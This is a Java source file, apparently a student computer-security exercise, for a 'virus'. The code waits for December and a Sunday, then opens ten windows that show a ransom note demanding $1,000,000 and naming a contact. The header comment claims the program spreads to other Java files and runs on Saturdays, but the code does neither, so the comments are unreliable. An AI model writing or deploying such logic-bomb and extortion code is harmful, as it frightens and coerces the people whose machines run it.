
//Computer
/*
 * The Virus will search for all the java files in the same directory. Then it will propagate to these files.
 * The virus will stay dormant until it is December, where the security mangers will be in their vacation.
 * It will runs in Saturday, were it be the last day of work in week, and mostly all will be tired.
 * The virus will run multiple screens with a message inside them.(10 screens, but can be modified for more)
 */
//ComputerSecurity
import java.time.LocalDate;
import java.time.DayOfWeek;
import javax.swing.*;

public class Virus {
    public static void main(String[] args) throws Exception {

        if (dormant()) {
            System.out.println("Not the time, sleeping...");
        } else if (trigger()) {
            payload();
        }
    }

    // This functino sets the wake up time
    public static boolean dormant() {
        LocalDate today = LocalDate.now();
        int month = today.getMonthValue();

        if (month == 12) {
            System.out.println("Time to wake up");
            return false;
        } else {
            return true;
        }
    }

    public static boolean trigger() {
        DayOfWeek dayOfWeek = LocalDate.now().getDayOfWeek(); // Get the day of the week
        if (dayOfWeek == DayOfWeek.SUNDAY) {
            return true;
        } else {
            return false;
        }

    }

    public static void payload() {
        String art = "        _________   _________\n" +
                "   ____/case  975\\ /case 975 \\____\n" +
                " /| ------------- |  ------------ |\\\n" +
                "||| ---Virus----- | ------------- |||\n" +
                "||| ------------- | --------------|||\n" +
                "||| ---Oops------ | ------------- |||\n" +
                "||| ---Hacked --- | ------------- |||\n" +
                "||| ------------- | ------------- |||\n" +
                "|||  ------------ | ----------    |||\n" +
                "||| --new-case--- |  ------------ |||\n" +
                "||| ---opened---- | ------------- |||\n" +
                "||| ------------- | ------ -----  |||\n" +
                "||| ------------  | ------------- |||\n" +
                "|||_____________  |  _____________|||\n" +
                "L/_____/--------\\\\_//--------\\_____\\\n"
                +
                "*************************************\n" +
                "*                                   *\n" +
                "*  Your Computer has been attacked  *\n" +
                "*  by Mostafa Shmaisani, contact on *\n" +
                "*  Github to prevent getting more   *\n" +
                "*  attacks.                         *\n" +
                "*  Payment price: 1,000,000 $       *\n" +
                "*                                   *\n" +
                "*  Your case number us 975, make    *\n" +
                "*  sure to attach it with your req- *\n" +
                "*  uest. Next launch : 01/01/2025   *\n" +
                "*  (After one month)                *\n" +
                "*                                   *\n" +
                "*              Mostafa Shmaisani ;-)*\n" +
                "*                                   *\n" +
                "*************************************";

        // Get the number of screens from the user
        // int numScreens = Integer.parseInt(JOptionPane.showInputDialog("Enter the
        // number of screens:"));
        int numScreens = 10;
        // Create an array of labels and panels for each screen
        JLabel[] labels = new JLabel[numScreens];
        JPanel[] panels = new JPanel[numScreens];

        // Create the frames and add the panel to each frame
        JFrame[] frames = new JFrame[numScreens];
        for (int i = 0; i < numScreens; i++) {
            // Create the label and panel for this screen
            labels[i] = new JLabel("<html><pre>" + art + "</pre></html>");
            panels[i] = new JPanel();
            panels[i].add(labels[i]);

            // Create the frame and add the panel to it
            frames[i] = new JFrame("Mostafa's Virus");
            frames[i].add(panels[i]);

            // Set the size and location of the frame
            frames[i].setSize(400, 600);
            frames[i].setLocation(i * 400, 0);

            // Set the frame to be visible
            frames[i].setVisible(true);

        }
    }
}